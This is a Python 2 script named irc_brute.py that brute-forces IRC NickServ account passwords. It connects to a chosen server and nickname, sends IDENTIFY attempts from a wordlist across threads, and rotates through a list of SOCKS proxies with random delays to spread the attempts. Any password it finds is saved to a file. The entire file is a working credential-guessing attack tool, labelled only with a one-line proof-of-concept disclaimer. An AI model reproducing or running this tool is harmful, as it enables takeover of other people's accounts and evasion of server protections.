#!/usr/bin/env python
# irc_brute.py
# This script is (c) Jan Dlabal, http://houbysoft.com
# Comments, mods, etc. are welcome @ dlabaljan [ ( at ) ] gmail (guess what) com
# You can share this under the terms of the GNU GPL v3 License



import sys,socket,string
import random
from time import sleep
from threading import Thread



waitfor = [1,2,3]
WORDLIST = []
PROXYLIST = []



class ibt(Thread):
  def __init__ (self,host,port,nick,wordlist,proxy):
    Thread.__init__(self)
    self.host = host
    self.port = port
    self.nick = nick
    self.wordlist = wordlist
    self.proxy = proxy
  def run(self):
    irc_brute_thread(self.host,self.port,self.nick,self.wordlist,self.proxy)



def irc_brute_thread(host,port,nick,wordlist,proxy):
  global WORDLIST
  if proxy!="NONE":
    s=socks.socksocket()
    proxy = proxy.split(":")
    if proxy[1][-1]=="\n":
      proxy[1] = proxy[1][:-1]
    s.setproxy(socks.PROXY_TYPE_SOCKS5,proxy[0],int(proxy[1]),False)
  else:
    s=socket.socket()
  s.settimeout(5)
  try:
    s.connect((host,port))
  except:
    for x in wordlist:
      WORDLIST.append(x)
    print "[-] Error, can't connect",
    if proxy!="NONE":
      print "(using proxy = "+proxy[0]+":"+proxy[1]+")"
    else:
      print
    quit()
  s.settimeout(15)
  print "[+] Initializing connection..."
  for i in range(0,2):
    print s.recv(1024)
  s.send("NICK %s\r\n" % nick)
  s.send("USER %s %s bla :%s\r\n" % (nick, host, nick))
  fail = True
  while fail:
    r = s.recv(1024)
    if r.lower().find("/msg nickserv identify")!=-1:
      fail = False
      print "[+] Connected!"
    else:
      print r
  fail = True
  for str in wordlist:
    if str[-1] == "\n":
      str = str[:-1]
    print "[~] Testing : "+str,
    s.send("PRIVMSG NickServ :IDENTIFY %s\r\n" % (str))
    tmp=True
    r=s.recv(1024)
    while tmp:
      if r.lower().find("you are now identified")!=-1:
        print "... WORKS!"
        print "[+] Success"
	WORDLIST = []
	file = open("irc_brute.txt","w")
	file.write(str)
	file.close()
        fail = False 
	tmp = False
      else:
        if r.lower().find("invalid password")==-1 and r.lower().find("password incorrect")==-1:
          print "\n[-] Bad response : "+r+", retrying."
	  r=s.recv(1024)
        else:
	  print "... failed"
	  tmp = False
    sleep(random.choice(waitfor))
  print "[-] Thread Exiting"


def irc_brute(server,port,nick,wordlist,proxylist):
  print "[+] STARTING... Password will be outputed to irc_brute.txt if found."
  global WORDLIST
  global PROXYLIST
  w = open(wordlist,"r")
  str = w.readline()
  while str:
    if str not in WORDLIST:
      WORDLIST.append(str)
    str = w.readline()
  w.close()

  if proxylist != "NONE":
    p = open(proxylist,"r")
    str = p.readline()
    while str:
      if str not in PROXYLIST:
        PROXYLIST.append(str)
      str = p.readline()
    p.close()
  else:
    PROXYLIST.append("NONE")

  i = 0
  i2 = 0

  if proxylist=="NONE":
    t=ibt(server,port,nick,WORDLIST,"NONE")
    t.start()
  else:
    while len(WORDLIST)!=0:
      wlist = []
      if i >= len(WORDLIST):
        i = 0
      if 20 >= len(WORDLIST):
        y = len(WORDLIST)
      else:
        y = 20
      for x in range(0,y):
        wlist.append(WORDLIST[x])
        i = i+1
      if i2 >= len(PROXYLIST):
        i2 = 0
      for x in wlist:
        WORDLIST.remove(x)
      t = ibt(server,port,nick,wlist,PROXYLIST[i2])
      i2 = i2 + 1
      t.start()
      sleep(5)



print "[-] Welcome to irc_brute.py."
print "[-] This script is available under the GNU GPL v3 License."
print "[-] (c) Jan Dlabal, http://houbysoft.com"
print "[-] THIS SCRIPT IS A PROOF-OF-CONCEPT, ANY ILLEGAL USAGE IS PROHIBITED."
if len(sys.argv) != 6:
  print ""
  print "[+] Usage : ./irc_brute.py SERVER PORT NICK WORDLIST PROXYLIST"
  print "	SERVER : Server on which to try bruteforce"
  print "	PORT   : Port on which to connect to SERVER (try 6667)"
  print "	NICK   : Nickname to bruteforce"
  print "	WORDLIST:File with one password to be tested per line"
  print "	PROXYLIST:File with one SOCKS proxy per line, the more the better - faster"
  print "			(try NONE if you don't have any)"
  quit()
else:
  if sys.argv[5] != "NONE":
    import socks
  irc_brute(sys.argv[1],int(sys.argv[2]),sys.argv[3],sys.argv[4],sys.argv[5])
